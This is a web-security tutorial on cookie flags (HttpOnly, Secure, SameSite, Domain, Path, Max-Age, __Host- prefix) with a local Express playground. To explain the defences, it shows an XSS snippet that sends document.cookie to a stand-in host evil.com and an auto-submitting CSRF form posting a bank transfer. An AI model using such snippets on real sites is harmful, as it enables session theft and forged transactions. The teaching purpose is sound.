# 10. Cookie Flags: HttpOnly, Secure, SameSite, Domain, Path, Max-Age

## Notes

### Why cookie flags matter

In topics 07 and 09 we put the **session ID** in a cookie. Remember: **whoever has the session ID *is* the user**. So we must control exactly:

- **Who** can read the cookie (only the server? or JavaScript too?)
- **When** the browser sends it (only over HTTPS? only from our own site?)
- **Where** it's sent (which domains, which paths?)
- **How long** it lives

That's what **cookie flags** (also called **cookie attributes**) do. They're extra rules written after the cookie's value:

```
Set-Cookie: sessionId=k9X2fQ; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
            └─ name=value ─┘ └──────────────────── flags (rules) ─────────────────────┘
```

The **server** sets the rules once. The **browser** follows them on every request.

---

### Real-life example: labels on a parcel 📦

Think of a cookie as a **parcel** the server gives the browser to carry around. The flags are **labels stuck on the parcel**:

| Label on the parcel | Cookie flag |
|---|---|
| "**Do not open.** Only the post office may look inside." | `HttpOnly`: JavaScript can't read it |
| "**Armoured truck only.**" | `Secure`: only sent over HTTPS |
| "**Only hand this to us if *we* asked for it**, not when a stranger asks." | `SameSite`: not sent with requests started by other websites |
| "**Deliver only to this address**" (or "any branch of this company") | `Domain`: which hosts get it |
| "**Only for the accounts department**" | `Path`: which URL paths get it |
| "**Throw away after 1 hour**" | `Max-Age` / `Expires`: when it's deleted |

---

### The flags at a glance

| Flag | What it does | Protects against | If you leave it out |
|---|---|---|---|
| `HttpOnly` | JavaScript **can't read** the cookie (`document.cookie`) | **XSS** stealing the session | JS can read it ❌ |
| `Secure` | Only sent over **HTTPS** | **Network sniffing** (café Wi-Fi) | Also sent over plain HTTP ❌ |
| `SameSite` | Controls sending on **cross-site** requests | **CSRF** | Most browsers treat it as `Lax` (Chrome, Edge), but not all |
| `Domain` | Which **hosts** receive it | Leaking to other subdomains | **Only the exact host** that set it ✅ (safest) |
| `Path` | Which **URL paths** receive it | (Organization, not real security) | The current path's folder |
| `Max-Age` / `Expires` | When the cookie is **deleted** | Sessions living forever | Deleted when the **browser closes** |

📊 **Diagrams:** open **[diagrams.html](diagrams.html)** in your browser (just double-click the file) to see:

- **Flow diagram**: the checks the **browser** does before attaching a cookie to a request (domain, path, expiry, Secure, SameSite)
- **Data flow**: what happens when a cookie is set, when an XSS script tries to steal it, and when an evil site tries to use it

In short: `server sets the cookie + rules → browser stores it → on each request, the browser checks every rule → sends it only if ALL rules pass`

Now let's look at each flag.

---

### 1. `HttpOnly`: hide the cookie from JavaScript 🙈

Without `HttpOnly`, any JavaScript on your page can read the cookie:

```js
console.log(document.cookie); // "sessionId=k9X2fQ; theme=dark"
```

That sounds harmless, until an attacker manages to run **their** JavaScript on your page (an **XSS** attack, for example through a comment box that doesn't escape HTML):

```html
<script>
  fetch("https://evil.com/steal?c=" + document.cookie); // sends your session to the attacker 😱
</script>
```

With `HttpOnly`, `document.cookie` simply **doesn't show** that cookie. The browser still sends it to your server on every request, but scripts can't touch it.

| Cookie | `HttpOnly`? |
|---|---|
| Session ID, refresh token, anything that logs you in | ✅ **Always** |
| UI preferences that JS needs to read (theme, language) | ❌ Not needed |

> ⚠️ `HttpOnly` stops XSS from **stealing** the cookie, but **not from using it**. An XSS script can still send requests from the victim's browser (and the cookie goes along automatically). You still have to prevent XSS itself (Level 7).

---

### 2. `Secure`: only over HTTPS 🔒

With `Secure`, the browser **never** sends the cookie over plain `http://`. This stops anyone on the network (café Wi-Fi, a hacked router) from reading it (topic 05).

```
https://shop.com/cart  →  Cookie: sessionId=k9X2fQ   ✅ sent
http://shop.com/cart   →  (no cookie)                ✅ protected
```

- **Always** use `Secure` for auth cookies in production.
- Browsers make an **exception for `http://localhost`**, so `Secure` cookies work during local development.
- `SameSite=None` **requires** `Secure`. Browsers reject it otherwise.

---

### 3. `SameSite`: stop other websites from using your cookie 🛡️

#### First: what is a "site"?

A **site** is the **main domain** (the "registrable domain"). Subdomains and ports don't count:

| URL A | URL B | Same site? |
|---|---|---|
| `https://shop.com` | `https://api.shop.com` | ✅ Yes (both are `shop.com`) |
| `https://shop.com` | `https://shop.com:8080` | ✅ Yes (ports don't matter) |
| `https://shop.com` | `https://evil.com` | ❌ No, this is **cross-site** |
| `http://localhost:3000` | `http://127.0.0.1:4000` | ❌ No (different hosts, which this topic's code uses for the demo) |

#### The problem: CSRF (Cross-Site Request Forgery)

The browser attaches cookies **automatically**, even when **another website** starts the request:

```html
<!-- on evil.com -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker"><input name="amount" value="50000">
</form>
<script>document.forms[0].submit();</script>
```

If you're logged in to `bank.com`, your browser sends your `bank.com` session cookie with this form. The bank thinks **you** sent it. 😱

`SameSite` tells the browser **when to attach the cookie to cross-site requests**:

| Value | Same-site requests | Cross-site link click (top-level `GET`) | Cross-site form `POST`, `fetch`, `<iframe>`, `<img>` |
|---|---|---|---|
| `Strict` | ✅ Sent | ❌ **Not sent** | ❌ Not sent |
| `Lax` ⭐ | ✅ Sent | ✅ Sent | ❌ **Not sent** |
| `None` (needs `Secure`) | ✅ Sent | ✅ Sent | ✅ Sent |

#### Which one should I use?

- **`Lax`**: the best default for session cookies. It blocks the CSRF form above, but you stay logged in when you click a link to the site from an email or Google.
- **`Strict`**: the most secure, but a bit annoying. If you click a link to `bank.com` from your email, you **arrive logged out**, because the cookie wasn't sent on that first cross-site navigation. Good for very sensitive actions.
- **`None`**: only when your cookie **must** work inside another site (an embedded widget, a payment iframe, third-party login flows). It must have `Secure`. Many browsers also block or limit these "third-party cookies".

> ⚠️ **Don't rely on the default.** Chrome and Edge treat a missing `SameSite` as `Lax`, but other browsers may not. Always write it explicitly.
>
> ⚠️ `SameSite` is a strong layer, but not a complete CSRF defense: `Lax` still allows top-level `GET`, so **never change data with `GET`**. Use CSRF tokens for extra safety (Level 7).

---

### 4. `Domain`: which hosts get the cookie 🌐

| How it's set | Sent to |
|---|---|
| **No `Domain`** (host-only cookie) ⭐ | **Only** the exact host that set it, e.g. `app.shop.com` |
| `Domain=shop.com` | `shop.com` **and every subdomain**: `app.shop.com`, `api.shop.com`, `blog.shop.com`, ... |

**Leaving `Domain` out is the safest choice.** If you set `Domain=shop.com`, then **any** subdomain gets your session cookie, including that old `blog.shop.com` running an outdated WordPress that someone hacks. 😬

Only set `Domain` when you **really need** to share login across subdomains (for example `shop.com` and `account.shop.com`).

> A site **can't** set a cookie for a different site (`bank.com` can't set cookies for `evil.com`), or for a public suffix like `.com` or `.co.in`.

---

### 5. `Path`: which URL paths get the cookie 📁

```
Set-Cookie: adminPrefs=compact; Path=/admin
```

This cookie is sent to `/admin`, `/admin/users`, and `/admin/settings`, but **not** to `/` or `/shop`.

- For session cookies, use **`Path=/`** so the cookie is sent to the whole site.
- ⚠️ **`Path` is NOT a security boundary.** Pages on other paths of the same site can still get to the cookie in other ways (through iframes or scripts). Use it for organization, never to "protect" a cookie.

---

### 6. `Max-Age` and `Expires`: how long it lives ⏳

| How it's set | Type | When it's deleted |
|---|---|---|
| Neither | **Session cookie** | When the browser closes (but many browsers "restore" sessions, so it can survive longer) |
| `Max-Age=3600` ⭐ | Persistent | 3600 seconds after it was set |
| `Expires=Wed, 04 Nov 2026 12:00:00 GMT` | Persistent | At that date and time |

- Prefer **`Max-Age`**: it's simpler and doesn't depend on the user's clock. If both are present, `Max-Age` wins.
- **To delete a cookie:** set it again with `Max-Age=0`. It must use the **same name, `Path`, and `Domain`**, or the browser treats it as a different cookie and the old one stays.

```
Set-Cookie: sessionId=; Path=/; Max-Age=0
```

> ⚠️ Remember topic 09: the cookie's lifetime is only a **hint to the browser**. The **server** must still check the session's idle and absolute timeouts itself.

---

### Bonus: cookie name prefixes `__Host-` and `__Secure-`

Browsers give special protection to cookies whose **names** start with these prefixes:

| Prefix | Browser only accepts it if... | Why it helps |
|---|---|---|
| `__Secure-` | It has `Secure` (and was set over HTTPS) | Guarantees the cookie came over HTTPS |
| `__Host-` ⭐ | It has `Secure`, **`Path=/`**, and **no `Domain`** | It's locked to **this exact host**. A hacked subdomain can't overwrite it. |

Using the `__Host-` prefix is the **strongest** setup for a session cookie.

---

### ⭐ The recommended session cookie

```
Set-Cookie: __Host-sessionId=k9X2fQ...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=28800
```

| Part | Why |
|---|---|
| `__Host-` | Locked to this host, can't be overwritten by subdomains |
| `HttpOnly` | XSS can't steal it |
| `Secure` | Never sent over plain HTTP |
| `SameSite=Lax` | Not sent with cross-site POSTs (CSRF), but links still work |
| `Path=/` | Sent to the whole site (and required by `__Host-`) |
| No `Domain` | Only this exact host (also required by `__Host-`) |
| `Max-Age=28800` | The browser deletes it after 8 hours (matching the server's absolute timeout) |

In **Express**:

```js
res.cookie("__Host-sessionId", sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: "lax",
  path: "/",
  maxAge: 8 * 60 * 60 * 1000, // Express uses milliseconds here!
});
```

---

### Other cookie facts worth knowing

- **Size limit:** about **4 KB per cookie**, and browsers limit how many cookies each site can have. Store an ID, not data.
- **Cookies are sent with every request** to the matching domain/path, **including images and CSS**. Big cookies slow down every request.
- **Never store sensitive data** in a cookie value (passwords, personal data). Users and malware can read their own cookies.
- **The browser decides** whether to send a cookie. A **server can't see the flags** in the `Cookie` header. It only receives `name=value` pairs.

---

### Common beginner mistakes

1. **No `HttpOnly` on the session cookie.**
   Any XSS bug can steal every user's session.

2. **No `Secure` in production.**
   The cookie leaks over plain HTTP.

3. **`SameSite=None` without `Secure`.**
   Browsers reject the cookie completely.

4. **Relying on the browser's default `SameSite`.**
   It's not the same in every browser. Always set it.

5. **Setting `Domain=yoursite.com` "just in case".**
   Now every subdomain gets the session. Leave `Domain` out unless you need it.

6. **Thinking `Path` protects a cookie.**
   It's for organization, not security.

7. **Deleting a cookie with a different `Path` or `Domain`** than it was set with.
   The old cookie stays. Match them exactly.

8. **Mixing up seconds and milliseconds.**
   `Max-Age` in the header is **seconds**. Express's `maxAge` option is **milliseconds**.

9. **Storing data in cookies** (user objects, roles, carts).
   Store a random ID and keep the data on the server (topic 09).

10. **Changing data with `GET` requests.**
    `SameSite=Lax` still sends cookies on cross-site `GET` links, so a `GET /delete-account` link is a CSRF hole.

---

### Interview questions

1. **What does `HttpOnly` do, and what doesn't it do?**
   It hides the cookie from JavaScript (`document.cookie`), so XSS can't steal it. It does not stop XSS from sending requests that include the cookie.

2. **What does `Secure` do?**
   The browser only sends the cookie over HTTPS (localhost is an exception for development).

3. **Explain `SameSite=Strict`, `Lax`, and `None`.**
   Strict: never sent on cross-site requests. Lax: sent on cross-site top-level GET navigations (link clicks), but not on cross-site POSTs, iframes, or fetches. None: always sent, and it requires Secure.

4. **How does `SameSite` help against CSRF?**
   CSRF relies on the browser attaching cookies to requests started by another site. With Lax or Strict, cross-site POSTs don't carry the cookie, so the forged request arrives unauthenticated.

5. **What's the difference between a session cookie and a persistent cookie?**
   A session cookie has no Max-Age or Expires and is deleted when the browser closes. A persistent cookie has a lifetime set with Max-Age or Expires.

6. **What happens if you set `Domain=example.com`?**
   The cookie is sent to example.com and all its subdomains. Without Domain, it's host-only, which is safer.

7. **How do you delete a cookie?**
   Set the same name with the same Path and Domain, an empty value, and `Max-Age=0` (or an Expires date in the past).

8. **What is the `__Host-` prefix?**
   A cookie name prefix that browsers only accept with Secure, Path=/, and no Domain. It locks the cookie to one host, so subdomains can't set or overwrite it.

9. **What's the ideal set of flags for a session cookie?**
   `__Host-sessionId=...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=<absolute timeout>`.

---

### Quick recap

- **`HttpOnly`**: JS can't read it (blocks XSS theft)
- **`Secure`**: HTTPS only (blocks network sniffing)
- **`SameSite`**: `Lax` ⭐ / `Strict` / `None` (blocks CSRF). Always set it explicitly.
- **`Domain`**: leave it **out** = only this exact host (safest)
- **`Path`**: use `/` for sessions. It's not a security feature.
- **`Max-Age`**: lifetime in **seconds**. `Max-Age=0` deletes (match Path + Domain).
- **`__Host-` prefix**: the strongest session cookie
- ⭐ `__Host-sessionId=...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=28800`

## Code

A **cookie playground** you open in your browser. It runs **two servers**:

| Server | Plays the role of |
|---|---|
| `http://localhost:3000` | **Your website** (it sets the cookies) |
| `http://127.0.0.1:4000` | **Another website** (a different site, so its requests are cross-site) |

📄 **Full code: [server.js](server.js)**. Open it and read the comments: each cookie shows off one flag.

```bash
node server.js
```

### Try it in your browser

Use **Chrome or Edge** (their `SameSite` behavior matches the table above).

**1. Set the demo cookies**

Open **http://localhost:3000/set**. It sets these cookies and sends you to the home page:

| Cookie | Flags | What it shows |
|---|---|---|
| `plain` | (none) | A normal cookie |
| `httpOnly` | `HttpOnly` | Hidden from JavaScript |
| `lax` | `SameSite=Lax` | Sent on cross-site links, not cross-site POSTs |
| `strict` | `SameSite=Strict` | Never sent cross-site |
| `none` | `SameSite=None; Secure` | Sent everywhere (if third-party cookies are allowed) |
| `adminOnly` | `Path=/admin` | Only sent to `/admin/...` |
| `shortLived` | `Max-Age=20` | Deleted after 20 seconds |
| `__Host-session` | `HttpOnly; Secure; SameSite=Lax; Path=/` | The recommended session cookie |

**2. HttpOnly: compare what JavaScript sees with what the server receives**

On the home page you'll see two boxes:
- **"What JavaScript can see"** (`document.cookie`): `httpOnly` and `__Host-session` are **missing** 🙈
- **"What the server receives"**: **all** of them are there (except `adminOnly`)

**3. Path: open http://localhost:3000/admin/echo**

Now `adminOnly` **is** included. It's only sent to paths under `/admin`.

**4. Max-Age: wait 20 seconds and refresh the home page**

`shortLived` is gone. The browser deleted it.

**5. SameSite: visit the "other website"**

Open **http://127.0.0.1:4000** and try its three buttons. Each one sends a **cross-site** request to `localhost:3000/echo`:

| Button | Cookies the server receives |
|---|---|
| **Click a link** (top-level `GET`) | `plain`, `lax`, `none`, `__Host-session`, ... but **not `strict`** |
| **Submit a form** (`POST`, like the CSRF attack) | **Only `none`**. `lax` and `strict` are blocked 🛡️ (see the 2-minute surprise below) |
| **Load in an iframe** | **Only `none`** (if third-party cookies are allowed) |

> 💡 **The 2-minute surprise:** cookies with **no `SameSite` flag** (like `plain` and `httpOnly`) are treated like `Lax` by Chrome and Edge, with one exception. For the **first 2 minutes** after such a cookie is set, Chrome still sends it on a cross-site **top-level `POST`** (called "Lax + POST", kept so old login flows don't break).
> Try it: open `/set`, then submit the form **right away**, and `plain` and `httpOnly` are sent too. Wait **more than 2 minutes** (without opening `/set` again) and submit the form again, and only `none` arrives.
> This is one more reason to **always set `SameSite` yourself**: `lax` was blocked from the very first second.

**6. Delete everything**

Open **http://localhost:3000/clear**. Every cookie is deleted with `Max-Age=0` (with the matching `Path`).

### Try the server side with curl

curl doesn't follow `SameSite` or `HttpOnly` (it's not a browser), but you can see the exact `Set-Cookie` headers:

```bash
curl -s -o /dev/null -D - http://localhost:3000/set | grep -i set-cookie
```

And you can see that the **server only receives `name=value` pairs**, never the flags:

```bash
curl -s -H "Cookie: plain=hello; lax=1" http://localhost:3000/echo
```
→ `{"path":"/echo","method":"GET","cookiesReceived":{"plain":"hello","lax":"1"}}`
